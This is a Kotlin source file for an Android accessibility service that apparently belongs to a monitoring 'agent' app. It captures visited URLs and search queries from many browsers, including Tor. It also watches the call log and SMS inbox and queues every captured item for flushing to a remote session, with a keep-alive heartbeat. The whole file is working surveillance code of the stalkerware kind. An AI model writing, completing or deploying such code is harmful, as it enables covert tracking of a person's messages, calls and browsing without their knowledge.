package com.zenvora.agent.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.zenvora.agent.manager.AppSessionTracker
import com.zenvora.agent.manager.BrowserHistoryStore
import com.zenvora.agent.manager.CallLogManager
import com.zenvora.agent.manager.EventQueue
import com.zenvora.agent.manager.HistorySnapshot
import com.zenvora.agent.manager.SMSManager
import java.util.Locale

/**
 * Captures visited URLs and searches from browsers after Accessibility is enabled.
 * Only reads the address bar — does not walk the whole page (that drained battery
 * and recorded the same random link over and over).
 */
class BrowserCaptureService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var pendingPkg: String? = null
    private var pendingBrowser: String? = null
    private val scanRunnable = Runnable { scanNow() }
    private val sessions by lazy { AppSessionTracker(applicationContext) }
    private var callObserver: ContentObserver? = null
    private var smsObserver: ContentObserver? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = serviceInfo ?: AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
            AccessibilityEvent.TYPE_VIEW_FOCUSED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
            AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
            AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
        info.notificationTimeout = 400
        info.packageNames = null
        serviceInfo = info
        BrowserHistoryStore.load(applicationContext)
        EventQueue.load(applicationContext)
        registerObservers()
        try {
            HistorySnapshot.enqueue(applicationContext)
        } catch (_: Exception) {
        }
        SessionPinger.requestFlush(applicationContext)
        KeepAlive.startService(applicationContext)
        handler.removeCallbacks(beatTick)
        handler.postDelayed(beatTick, BEAT_MS)
    }

    private val beatTick = object : Runnable {
        override fun run() {
            SessionPinger.requestFlush(applicationContext)
            KeepAlive.startService(applicationContext)
            handler.postDelayed(this, BEAT_MS)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            sessions.onForeground(pkg)
        }
        val browser = browserLabel(pkg) ?: return
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val fromEvent = eventText(event)
            val urlFromEvent = normalizeUrl(fromEvent) ?: searchFromTitle(fromEvent)
            if (urlFromEvent != null) commit(browser, urlFromEvent, fromEvent, pkg)
        }
        pendingPkg = pkg
        pendingBrowser = browser
        handler.removeCallbacks(scanRunnable)
        val delay = if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) 450L else 800L
        handler.postDelayed(scanRunnable, delay)
    }

    override fun onInterrupt() {
        sessions.closeSession()
    }

    override fun onDestroy() {
        handler.removeCallbacks(scanRunnable)
        handler.removeCallbacks(beatTick)
        sessions.closeSession()
        unregisterObservers()
        super.onDestroy()
    }

    private fun registerObservers() {
        val h = Handler(Looper.getMainLooper())
        if (callObserver == null) {
            callObserver = object : ContentObserver(h) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    val items = CallLogManager(applicationContext).fetch(8)
                    for (i in 0 until items.length()) {
                        EventQueue.add(applicationContext, "FETCH_CALL_LOGS", items.getJSONObject(i))
                    }
                    if (items.length() > 0) SessionPinger.requestFlushDebounced(applicationContext)
                }
            }
            try {
                contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callObserver!!)
            } catch (_: Exception) {
            }
        }
        if (smsObserver == null) {
            smsObserver = object : ContentObserver(h) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    val items = SMSManager(applicationContext).fetch(8)
                    for (i in 0 until items.length()) {
                        EventQueue.add(applicationContext, "FETCH_SMS_MESSAGES", items.getJSONObject(i))
                    }
                    if (items.length() > 0) SessionPinger.requestFlushDebounced(applicationContext)
                }
            }
            try {
                contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver!!)
            } catch (_: Exception) {
            }
        }
    }

    private fun unregisterObservers() {
        try {
            callObserver?.let { contentResolver.unregisterContentObserver(it) }
        } catch (_: Exception) {
        }
        try {
            smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        } catch (_: Exception) {
        }
        callObserver = null
        smsObserver = null
    }

    private fun scanNow() {
        val pkg = pendingPkg ?: return
        val browser = pendingBrowser ?: return
        val root = try {
            rootInActiveWindow
        } catch (_: Exception) {
            null
        } ?: return
        val bar = findUrlBar(root, pkg).orEmpty()
        val title = windowTitle(root)
        val url = resolveVisit(bar, title, browser) ?: return
        commit(browser, url, title.ifBlank { bar }, pkg)
    }

    private fun commit(browser: String, url: String, title: String, pkg: String) {
        BrowserHistoryStore.add(applicationContext, browser, url, title, pkg)?.let { entry ->
            EventQueue.add(applicationContext, "FETCH_BROWSER_HISTORY", entry)
            SessionPinger.requestFlushDebounced(applicationContext)
        }
    }

    private fun findUrlBar(root: AccessibilityNodeInfo, pkg: String): String? {
        val ids = listOf(
            "$pkg:id/url_bar",
            "$pkg:id/url_bar_title",
            "$pkg:id/url_bar_text",
            "$pkg:id/location_bar_edit_text",
            "$pkg:id/mozac_browser_toolbar_url_view",
            "$pkg:id/mozac_browser_toolbar_origin_view",
            "$pkg:id/url",
            "$pkg:id/omnibox",
            "$pkg:id/omnibox_url_bar",
            "$pkg:id/location_bar",
            "$pkg:id/url_field",
            "$pkg:id/address_bar",
            "com.android.chrome:id/url_bar",
            "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
            "com.sec.android.app.sbrowser:id/location_bar_edit_text",
            "com.microsoft.emmx:id/url_bar",
            "com.opera.browser:id/url_field",
            "com.brave.browser:id/url_bar"
        )
        for (id in ids) {
            val nodes = try {
                root.findAccessibilityNodeInfosByViewId(id)
            } catch (_: Exception) {
                null
            } ?: continue
            for (node in nodes) {
                val text = nodeText(node)
                normalizeUrl(text)?.let { return it }
                if (text.isNotBlank() && !isPlaceholder(text)) return text
            }
        }
        return null
    }

    private fun windowTitle(root: AccessibilityNodeInfo): String {
        return nodeText(root).ifBlank {
            try {
                root.contentDescription?.toString().orEmpty()
            } catch (_: Exception) {
                ""
            }
        }
    }

    private fun nodeText(node: AccessibilityNodeInfo): String {
        val text = try {
            node.text?.toString().orEmpty()
        } catch (_: Exception) {
            ""
        }
        val desc = try {
            node.contentDescription?.toString().orEmpty()
        } catch (_: Exception) {
            ""
        }
        return when {
            text.isNotBlank() -> text
            desc.isNotBlank() -> desc
            else -> ""
        }
    }

    private fun eventText(event: AccessibilityEvent): String {
        return event.text?.joinToString(" ").orEmpty().ifBlank {
            event.contentDescription?.toString().orEmpty()
        }
    }

    private fun resolveVisit(bar: String, title: String, @Suppress("UNUSED_PARAMETER") browser: String): String? {
        searchFromTitle(title)?.let { return it }
        return normalizeUrl(bar)
    }

    private fun searchFromTitle(title: String): String? {
        val t = title.trim()
        if (t.length < 2) return null
        val patterns = listOf(
            " - Google Search" to "https://www.google.com/search?q=",
            " – Google Search" to "https://www.google.com/search?q=",
            " - Bing" to "https://www.bing.com/search?q=",
            " at DuckDuckGo" to "https://duckduckgo.com/?q=",
            " - Yahoo Search" to "https://search.yahoo.com/search?p="
        )
        for ((suffix, prefix) in patterns) {
            val idx = t.indexOf(suffix, ignoreCase = true)
            if (idx > 0) {
                val q = t.substring(0, idx).trim()
                if (q.isNotBlank() && !isPlaceholder(q)) {
                    return prefix + Uri.encode(q)
                }
            }
        }
        return null
    }

    private fun normalizeUrl(raw: String): String? {
        val trimmed = raw.trim()
        if (trimmed.length < 4 || isPlaceholder(trimmed)) return null
        extractHttp(trimmed)?.let { return it }
        val host = trimmed.removePrefix("www.").substringBefore(" ").substringBefore("/")
        if (host.contains(".") && !host.contains(" ") && HOST_REGEX.matches(host)) {
            return if (trimmed.startsWith("http")) trimmed else "https://$trimmed"
        }
        return null
    }

    private fun extractHttp(raw: String): String? {
        val match = URL_REGEX.find(raw) ?: return null
        return match.value.trim().trimEnd('.', ',', ')', ']')
    }

    private fun isPlaceholder(text: String): Boolean {
        return PLACEHOLDER.any { text.equals(it, true) || text.startsWith(it, true) }
    }

    private fun browserLabel(pkg: String): String? {
        val p = pkg.lowercase(Locale.US)
        return when {
            p == "com.android.chrome" || p.startsWith("com.chrome") || p.contains("kiwibrowser") -> "Chrome"
            p.contains("firefox") || p.contains("mozilla") || p.contains("fenix") -> "Firefox"
            p.contains("sbrowser") || p.contains("samsung.android.internet") -> "Samsung"
            p.contains("opera") -> "Opera"
            p.contains("brave") -> "Brave"
            p.contains("microsoft.emmx") || p.contains("microsoft.edge") -> "Edge"
            p.contains("duckduckgo") -> "DuckDuckGo"
            p.contains("vivaldi") -> "Vivaldi"
            p.contains("uc.browser") || p.contains("ucmobile") || p == "com.uc.browser.en" -> "UC"
            p.contains("yandex.browser") -> "Yandex"
            p.contains("naver.whale") -> "Whale"
            p.contains("huawei.browser") -> "Huawei"
            p.contains("mi.globalbrowser") || p == "com.android.browser" -> "Mi Browser"
            p.contains("coloros.browser") || p.contains("heytap.browser") -> "OPPO"
            p.contains("vivo.browser") -> "vivo"
            p.contains("ecosia") -> "Ecosia"
            p.contains("torbrowser") || p.contains("tor.browser") -> "Tor"
            p.contains("via") && p.contains("mark") -> "Via"
            p.contains("puffin") -> "Puffin"
            p.contains("browser") && !p.contains("webview") && !p.startsWith("com.zenvora") -> "Browser"
            else -> null
        }
    }

    companion object {
        private const val BEAT_MS = 4 * 60 * 1000L
        private val URL_REGEX = Regex("https?://[^\\s\"'<>]+", RegexOption.IGNORE_CASE)
        private val HOST_REGEX = Regex("^[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}(:\\d+)?$")
        private val PLACEHOLDER = listOf(
            "Search or type",
            "Search or enter",
            "Address and search",
            "Search DuckDuckGo",
            "Search with Google",
            "Search or type URL",
            "Search or type web address"
        )
    }
}
